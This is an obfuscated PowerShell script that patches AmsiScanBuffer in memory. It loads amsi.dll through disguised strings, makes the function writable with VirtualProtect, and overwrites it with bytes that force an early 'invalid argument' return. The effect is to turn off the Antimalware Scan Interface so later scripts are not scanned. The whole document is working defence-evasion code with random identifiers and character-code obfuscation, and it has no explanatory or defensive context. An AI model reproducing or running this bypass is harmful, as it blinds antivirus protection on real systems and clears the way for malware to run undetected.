$ZTTfE9JWoCg = @"
using System;
using System.Runtime.InteropServices;
public class ZTTfE9JWoCg {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr UydupHV8d0L6Z0, string Hh1i3pjhLK0f);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr UqHeImXJS, UIntPtr SfjDdsDfEDF3z, uint IaavgIB, out uint zHnGj0Lmat3);
}
"@

Add-Type $ZTTfE9JWoCg

$df9 = [ZTTfE9JWoCg]::LoadLibrary("$(('âmsì.d'+'ll').NoRMALiZe([ChAR](37+33)+[chAr]([ByTe]0x6f)+[cHar](114+105-105)+[chAR](109+107-107)+[cHAR](68*2/2)) -replace [chAr](92+21-21)+[chAR](112*42/42)+[char](123*38/38)+[char]([BytE]0x4d)+[CHAr](110)+[cHar]([BYTe]0x7d))")
$dkhtHDBiKdc = [ZTTfE9JWoCg]::GetProcAddress($df9, "$([chAR]([BytE]0x41)+[cHAr]([BytE]0x6d)+[CHAr](18+97)+[ChAr](105+66-66)+[ChaR](83)+[ChAr]([BytE]0x63)+[CHaR]([bYTE]0x61)+[CHaR](2+108)+[CHaR](66+32-32)+[CHaR](117*62/62)+[cHaR]([byTe]0x66)+[CHAr]([bYte]0x66)+[cHar](101*61/61)+[chAR]([BYte]0x72))")
$p = 0
[ZTTfE9JWoCg]::VirtualProtect($dkhtHDBiKdc, [uint32]5, 0x40, [ref]$p)
$fNA0V7Q_SW = "0xB8"
$qR3IPMZWXtKKH = "0x57"
$yXOKQ92V3ev2S = "0x00"
$PBYjsF7IHaM = "0x07"
$SjNlro6HuxYk = "0x80"
$bOUbOzuGb_sE = "0xC3"
$yJK = [Byte[]] ($fNA0V7Q_SW,$qR3IPMZWXtKKH,$yXOKQ92V3ev2S,$PBYjsF7IHaM,+$SjNlro6HuxYk,+$bOUbOzuGb_sE)
[System.Runtime.InteropServices.Marshal]::Copy($yJK, 0, $dkhtHDBiKdc, 6)